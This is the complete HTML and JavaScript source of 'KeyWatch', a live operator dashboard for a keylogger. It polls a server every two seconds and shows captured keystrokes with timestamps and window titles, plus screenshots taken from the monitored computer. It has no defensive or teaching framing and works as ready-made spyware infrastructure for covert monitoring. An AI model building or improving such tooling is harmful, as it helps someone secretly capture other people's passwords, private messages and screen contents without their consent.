<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>KeyWatch — Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
<style>
  :root {
    --bg: #0a0a0f;
    --surface: #111118;
    --surface2: #16161f;
    --border: #1e1e2e;
    --accent: #00ff88;
    --accent2: #00c8ff;
    --danger: #ff3366;
    --warn: #ffaa00;
    --text: #e0e0f0;
    --muted: #555570;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Syne', sans-serif;
    min-height: 100vh;
    display: grid;
    grid-template-rows: auto 1fr;
  }
  body::before {
    content:'';
    position:fixed; inset:0;
    background-image:
      linear-gradient(rgba(0,255,136,.025) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,255,136,.025) 1px, transparent 1px);
    background-size:40px 40px;
    pointer-events:none; z-index:0;
  }

  nav {
    position:sticky; top:0; z-index:100;
    background:rgba(10,10,15,.95);
    backdrop-filter:blur(12px);
    border-bottom:1px solid var(--border);
    display:flex; align-items:center; justify-content:space-between;
    padding:0 28px; height:56px;
  }
  .nav-logo { display:flex; align-items:center; gap:10px; }
  .logo-mark { width:28px; height:28px; border:1.5px solid var(--accent); display:grid; place-items:center; font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent); }
  .logo-text { font-family:'Share Tech Mono',monospace; font-size:13px; letter-spacing:3px; text-transform:uppercase; }
  .nav-right { display:flex; align-items:center; gap:16px; }
  .live-badge { display:flex; align-items:center; gap:6px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--accent); }
  .live-dot { width:7px; height:7px; border-radius:50%; background:var(--accent); animation:pulse 1.5s ease-in-out infinite; }
  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
  .btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; text-transform:uppercase; background:transparent; padding:6px 14px; cursor:pointer; border-radius:2px; transition:all .2s; text-decoration:none; }
  .btn-danger { border:1px solid var(--danger); color:var(--danger); }
  .btn-danger:hover { background:rgba(255,51,102,.1); }
  .btn-muted { border:1px solid var(--border); color:var(--muted); }
  .btn-muted:hover { border-color:var(--text); color:var(--text); }

  main { position:relative; z-index:1; padding:24px 28px; display:flex; flex-direction:column; gap:20px; max-width:1400px; width:100%; margin:0 auto; }

  /* STATS */
  .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:14px; }
  .stat-card { background:var(--surface); border:1px solid var(--border); border-radius:2px; padding:16px 20px; position:relative; overflow:hidden; }
  .stat-card::before { content:''; position:absolute; top:0; left:0; width:3px; height:100%; }
  .stat-card.green::before { background:var(--accent); }
  .stat-card.blue::before  { background:var(--accent2); }
  .stat-card.yellow::before{ background:var(--warn); }
  .stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:8px; }
  .stat-value { font-family:'Share Tech Mono',monospace; font-size:28px; font-weight:700; line-height:1; }
  .stat-card.green  .stat-value { color:var(--accent); }
  .stat-card.blue   .stat-value { color:var(--accent2); }
  .stat-card.yellow .stat-value { color:var(--warn); }

  /* TABS */
  .panel { background:var(--surface); border:1px solid var(--border); border-radius:2px; display:flex; flex-direction:column; flex:1; overflow:hidden; min-height:500px; }
  .tab-bar { display:flex; border-bottom:1px solid var(--border); }
  .tab-btn { font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:2px; text-transform:uppercase; background:transparent; border:none; border-bottom:2px solid transparent; color:var(--muted); padding:12px 22px; cursor:pointer; transition:color .2s,border-color .2s; margin-bottom:-1px; }
  .tab-btn.active { color:var(--accent); border-bottom-color:var(--accent); }
  .tab-btn:hover:not(.active) { color:var(--text); }

  /* TOOLBAR */
  .toolbar { display:flex; align-items:center; justify-content:space-between; padding:10px 16px; border-bottom:1px solid var(--border); background:var(--surface2); gap:12px; flex-wrap:wrap; }
  .search-input { background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:12px; padding:6px 12px; border-radius:2px; outline:none; width:220px; transition:border-color .2s; }
  .search-input:focus { border-color:var(--accent); }
  .toggle-wrap { display:flex; align-items:center; gap:8px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); cursor:pointer; user-select:none; }
  .toggle { width:32px; height:16px; background:var(--border); border-radius:8px; position:relative; transition:background .2s; flex-shrink:0; }
  .toggle.on { background:var(--accent); }
  .toggle::after { content:''; position:absolute; width:12px; height:12px; border-radius:50%; background:#fff; top:2px; left:2px; transition:transform .2s; }
  .toggle.on::after { transform:translateX(16px); }

  /* LOG FEED — matches original format exactly */
  .log-body { flex:1; overflow-y:auto; font-family:'Share Tech Mono',monospace; font-size:12.5px; line-height:1.6; }
  .log-body::-webkit-scrollbar { width:4px; }
  .log-body::-webkit-scrollbar-track { background:var(--bg); }
  .log-body::-webkit-scrollbar-thumb { background:var(--border); }

  .log-line {
    display:flex;
    align-items:baseline;
    padding:4px 16px;
    border-bottom:1px solid rgba(30,30,46,0.4);
    gap:0;
    animation:rowIn .25s ease forwards;
    white-space:nowrap;
    overflow:hidden;
  }
  @keyframes rowIn { from{opacity:0;background:rgba(0,255,136,.04)} to{opacity:1;background:transparent} }
  .log-line:hover { background:var(--surface2); }

  /* The pipe separators — styled exactly like the original file */
  .log-ts   { color:var(--muted); flex-shrink:0; }
  .sep      { color:#333350; padding:0 8px; flex-shrink:0; }
  .log-win  { color:var(--accent2); overflow:hidden; text-overflow:ellipsis; flex:1; min-width:0; }
  .log-key  { flex-shrink:0; padding-left:8px; font-weight:700; }
  .log-key.char    { color:var(--accent); }
  .log-key.special { color:var(--warn); }
  .log-key.control { color:var(--danger); }

  .empty-state { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; height:300px; color:var(--muted); font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:2px; }
  .empty-icon { font-size:36px; opacity:.2; }

  /* PAGINATION */
  .pagination { display:flex; align-items:center; gap:8px; padding:10px 16px; border-top:1px solid var(--border); background:var(--surface2); }
  .pg-btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:1px; background:transparent; border:1px solid var(--border); color:var(--muted); padding:5px 12px; cursor:pointer; border-radius:2px; transition:all .2s; }
  .pg-btn:hover:not(:disabled) { border-color:var(--accent); color:var(--accent); }
  .pg-btn:disabled { opacity:.3; cursor:default; }
  .pg-info { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); letter-spacing:1px; }

  /* SCREENSHOTS */
  .ss-grid { padding:16px; display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:14px; overflow-y:auto; }
  .ss-card { background:var(--bg); border:1px solid var(--border); border-radius:2px; overflow:hidden; cursor:pointer; transition:border-color .2s,transform .15s; }
  .ss-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
  .ss-img { width:100%; display:block; aspect-ratio:16/9; object-fit:cover; }
  .ss-meta { padding:7px 12px; display:flex; justify-content:space-between; align-items:center; gap:8px; }
  .ss-ts  { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); flex-shrink:0; }
  .ss-win { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

  /* LIGHTBOX */
  .lightbox { display:none; position:fixed; inset:0; background:rgba(0,0,0,.93); z-index:999; align-items:center; justify-content:center; flex-direction:column; gap:12px; }
  .lightbox.open { display:flex; }
  .lightbox img { max-width:92vw; max-height:82vh; border:1px solid var(--border); }
  .lb-meta { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:1px; }
  .lb-close { position:absolute; top:20px; right:24px; font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--muted); cursor:pointer; background:none; border:none; letter-spacing:2px; }
  .lb-close:hover { color:var(--text); }
</style>
</head>
<body>

<nav>
  <div class="nav-logo">
    <div class="logo-mark">KW</div>
    <span class="logo-text">KeyWatch</span>
  </div>
  <div class="nav-right">
    <div class="live-badge"><div class="live-dot"></div>LIVE</div>
    <button class="btn btn-danger" onclick="clearLogs()">CLEAR ALL</button>
    <a href="/logout" class="btn btn-muted">LOGOUT</a>
  </div>
</nav>

<main>

  <!-- STATS -->
  <div class="stats-row">
    <div class="stat-card green">
      <div class="stat-label">Total Keystrokes</div>
      <div class="stat-value" id="stat-total">—</div>
    </div>
    <div class="stat-card blue">
      <div class="stat-label">Active Windows</div>
      <div class="stat-value" id="stat-windows">—</div>
    </div>
    <div class="stat-card yellow">
      <div class="stat-label">Screenshots</div>
      <div class="stat-value" id="stat-ss">—</div>
    </div>
  </div>

  <!-- PANEL -->
  <div class="panel">
    <div class="tab-bar">
      <button class="tab-btn active" id="tab-keys" onclick="switchTab('keys')">⌨ Keystrokes</button>
      <button class="tab-btn"        id="tab-ss"   onclick="switchTab('ss')">📸 Screenshots</button>
    </div>

    <!-- KEYSTROKE PANE -->
    <div id="pane-keys" style="display:flex;flex-direction:column;flex:1;overflow:hidden;">
      <div class="toolbar">
        <input class="search-input" type="text" id="search-input" placeholder="Filter by window..." oninput="filterLogs()"/>
        <label class="toggle-wrap" onclick="toggleAR()">
          AUTO-REFRESH <div class="toggle on" id="ar-toggle"></div>
        </label>
      </div>
      <div class="log-body" id="log-body"></div>
      <div class="pagination">
        <button class="pg-btn" id="prev-btn" onclick="changePage(-1)" disabled>← PREV</button>
        <span class="pg-info" id="pg-info">Page 1 / 1</span>
        <button class="pg-btn" id="next-btn" onclick="changePage(1)">NEXT →</button>
        <span class="pg-info" style="margin-left:auto" id="total-info">0 events</span>
      </div>
    </div>

    <!-- SCREENSHOT PANE -->
    <div id="pane-ss" style="display:none;flex-direction:column;flex:1;overflow:hidden;">
      <div class="toolbar">
        <span class="pg-info">Last 20 screenshots — cleared on server restart</span>
        <label class="toggle-wrap" onclick="toggleAR()">
          AUTO-REFRESH <div class="toggle on" id="ar-toggle-ss"></div>
        </label>
      </div>
      <div class="ss-grid" id="ss-grid">
        <div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>
      </div>
    </div>

  </div>
</main>

<!-- LIGHTBOX -->
<div class="lightbox" id="lightbox" onclick="closeLb()">
  <button class="lb-close">✕ CLOSE</button>
  <img id="lb-img" src="" alt=""/>
  <div class="lb-meta" id="lb-meta"></div>
</div>

<script>
  // ── State ─────────────────────────────────
  let page       = 1;
  let autoRef    = true;
  let timer      = null;
  let loaded     = [];
  let filterTxt  = '';
  let activeTab  = 'keys';

  const CTRL_KEYS = ['esc','ctrl','alt','cmd','super','menu'];
  const SPEC_KEYS = ['enter','backspace','tab','space','shift','caps_lock',
    'delete','up','down','left','right','home','end',
    'page_up','page_down','f1','f2','f3','f4','f5','f6',
    'f7','f8','f9','f10','f11','f12'];

  function keyClass(k){
    const l = k.toLowerCase();
    if(CTRL_KEYS.some(s=>l===s)) return 'control';
    if(SPEC_KEYS.some(s=>l===s)) return 'special';
    return 'char';
  }

  // ── Fetch ─────────────────────────────────
  async function loadEvents(){
    try{
      const r = await fetch(`/api/events?page=${page}`);
      const d = await r.json();
      loaded  = d.events;
      document.getElementById('stat-total').textContent = d.total;
      renderLogs();
      updatePg(d.total, d.per_page);
    }catch(e){ console.error(e); }
  }

  async function loadStats(){
    try{
      const r = await fetch('/api/stats');
      const d = await r.json();
      document.getElementById('stat-windows').textContent = d.top_windows.length;
      document.getElementById('stat-ss').textContent      = d.total_screenshots;
    }catch(e){ console.error(e); }
  }

  async function loadScreenshots(){
    try{
      const r = await fetch('/api/screenshots?limit=20');
      const d = await r.json();
      const g = document.getElementById('ss-grid');
      if(!d.screenshots.length){
        g.innerHTML='<div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>';
        return;
      }
      g.innerHTML = d.screenshots.map(s=>`
        <div class="ss-card" onclick="openLb('${s.image}','${esc(s.timestamp)} | ${esc(s.window)}')">
          <img class="ss-img" src="data:image/jpeg;base64,${s.image}" loading="lazy"/>
          <div class="ss-meta">
            <span class="ss-ts">${esc(s.timestamp)}</span>
            <span class="ss-win">${esc(s.window)}</span>
          </div>
        </div>`).join('');
    }catch(e){ console.error(e); }
  }

  // ── Render logs ───────────────────────────
  // Format: 2026-03-27 00:25:19 | New Tab - Google Chrome | s
  function renderLogs(){
    const body = document.getElementById('log-body');
    let rows = loaded;
    if(filterTxt) rows = rows.filter(e=>e.window.toLowerCase().includes(filterTxt));
    if(!rows.length){
      body.innerHTML=`<div class="empty-state"><div class="empty-icon">⌨</div><div>AWAITING KEYSTROKES</div></div>`;
      return;
    }
    body.innerHTML = rows.map(e=>{
      const cls = keyClass(e.key);
      return `<div class="log-line">
        <span class="log-ts">${esc(e.timestamp)}</span>
        <span class="sep">|</span>
        <span class="log-win">${esc(e.window)}</span>
        <span class="sep">|</span>
        <span class="log-key ${cls}">${esc(e.key)}</span>
      </div>`;
    }).join('');
  }

  function filterLogs(){
    filterTxt = document.getElementById('search-input').value.toLowerCase();
    renderLogs();
  }

  function updatePg(total, perPage){
    const pages = Math.ceil(total/perPage)||1;
    document.getElementById('pg-info').textContent    = `Page ${page} / ${pages}`;
    document.getElementById('total-info').textContent = `${total} events`;
    document.getElementById('prev-btn').disabled = page<=1;
    document.getElementById('next-btn').disabled = page>=pages;
  }

  // ── Controls ──────────────────────────────
  function changePage(d){ page = Math.max(1,page+d); loadEvents(); }

  function switchTab(t){
    activeTab = t;
    document.getElementById('pane-keys').style.display = t==='keys'?'flex':'none';
    document.getElementById('pane-ss').style.display   = t==='ss'?'flex':'none';
    document.getElementById('tab-keys').className = 'tab-btn'+(t==='keys'?' active':'');
    document.getElementById('tab-ss').className   = 'tab-btn'+(t==='ss'?' active':'');
    if(t==='ss') loadScreenshots();
  }

  function toggleAR(){
    autoRef = !autoRef;
    const cls = 'toggle'+(autoRef?' on':'');
    document.getElementById('ar-toggle').className    = cls;
    document.getElementById('ar-toggle-ss').className = cls;
    autoRef ? startTimer() : stopTimer();
  }

  function startTimer(){
    if(timer) clearInterval(timer);
    timer = setInterval(()=>{
      loadEvents(); loadStats();
      if(activeTab==='ss') loadScreenshots();
    }, 2000);
  }

  function stopTimer(){ if(timer) clearInterval(timer); }

  async function clearLogs(){
    if(!confirm('Clear ALL logs and screenshots from server memory?')) return;
    await fetch('/api/clear',{method:'POST'});
    page=1; loadEvents(); loadStats(); loadScreenshots();
  }

  // ── Lightbox ──────────────────────────────
  function openLb(b64,meta){
    document.getElementById('lb-img').src        = `data:image/jpeg;base64,${b64}`;
    document.getElementById('lb-meta').textContent = meta;
    document.getElementById('lightbox').classList.add('open');
  }
  function closeLb(){ document.getElementById('lightbox').classList.remove('open'); }

  function esc(s){
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  // ── Init ──────────────────────────────────
  loadEvents(); loadStats(); startTimer();
</script>
</body>
</html>
